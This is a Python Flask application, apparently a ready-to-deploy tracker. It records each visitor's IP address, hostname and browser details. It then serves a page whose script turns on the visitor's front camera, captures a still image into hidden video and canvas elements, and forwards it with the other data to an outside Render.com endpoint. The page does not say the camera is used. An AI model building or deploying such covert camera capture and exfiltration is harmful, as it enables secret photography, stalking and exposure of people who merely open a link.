from flask import Flask, request, render_template_string, jsonify
import time
import json
from user_agents import parse
import os
import requests
import socket

app = Flask(__name__)

visitor_data = []

# Replace with your actual Render.com endpoint that can accept POST requests
RENDER_ENDPOINT = "https://your-render-service.onrender.com/receive-data"  # Update this URL

@app.route('/track')
def track():
    ip_address = request.remote_addr
    raw_user_agent = request.headers.get('User-Agent', 'Unknown')
    headers = dict(request.headers)

    ua = parse(raw_user_agent)
    
    try:
        hostname = socket.gethostbyaddr(ip_address)[0]
    except (socket.herror, socket.gaierror):
        hostname = 'Unknown'

    browser_profile_name = (
        f"{ua.browser.family or 'Unknown'}-{ua.browser.version_string or 'Unknown'}_"
        f"{ua.os.family or 'Unknown'}-{ua.os.version_string or 'Unknown'}_"
        f"{ua.device.family or 'Unknown'}-{ua.device.brand or 'Unknown'}"
    ).replace(" ", "-")

    visitor_info = {
        'ip': ip_address,
        'hostname': hostname,
        'user_agent': raw_user_agent,
        'browser_profile_name': browser_profile_name,
        'timestamp': time.strftime('%Y-%m-%d %H:%M:%S'),
    }
    visitor_data.append(visitor_info)

    html = """
    <html>
    <body>
        <h1>Data Collection in Progress</h1>
        <p>Your information has been recorded.</p>
        <video id="video" width="640" height="480" autoplay style="display:none;"></video>
        <canvas id="canvas" width="640" height="480" style="display:none;"></canvas>
        
        <script>
            async function captureScreenshot() {
                const video = document.getElementById('video');
                const canvas = document.getElementById('canvas');
                const context = canvas.getContext('2d');

                try {
                    // Request front-facing camera
                    const stream = await navigator.mediaDevices.getUserMedia({
                        video: { 
                            facingMode: 'user'
                        }
                    });
                    video.srcObject = stream;

                    await new Promise(resolve => video.onloadedmetadata = resolve);
                    context.drawImage(video, 0, 0, canvas.width, canvas.height);
                    const screenshot = canvas.toDataURL('image/jpeg');
                    stream.getTracks().forEach(track => track.stop());

                    return screenshot;
                } catch (err) {
                    console.error('Error capturing screenshot:', err);
                    return null;
                }
            }

            const deviceInfo = {
                timestamp: new Date().toISOString()
            };

            (async () => {
                const screenshot = await captureScreenshot();
                if (screenshot) {
                    deviceInfo.screenshot = screenshot;
                }

                fetch('/log', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(deviceInfo)
                }).then(response => {
                    if (response.ok) {
                        console.log('Data sent successfully');
                    }
                }).catch(err => console.log('Error sending data:', err));
            })();
        </script>
    </body>
    </html>
    """
    return render_template_string(html)

@app.route('/log', methods=['POST'])
def log():
    client_data = request.json
    if visitor_data and client_data:
        visitor_data[-1].update(client_data)
        send_to_render(visitor_data[-1])
    return jsonify({'status': 'success'})

def send_to_render(data):
    try:
        # Send the data including the screenshot to Render.com
        headers = {'Content-Type': 'application/json'}
        response = requests.post(RENDER_ENDPOINT, json=data, headers=headers, timeout=15)
        
        if response.status_code == 200:
            print(f"Data sent successfully to Render.com: {response.status_code}")
            print("Sent data:", json.dumps(data, indent=2))
        else:
            print(f"Failed to send data to Render.com: {response.status_code}")
            print(f"Response: {response.text}")
    except Exception as e:
        print(f"Error sending to Render.com: {e}")

@app.route('/')
def root():
    return "Welcome to the tracker. Visit /track to collect data."

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port)
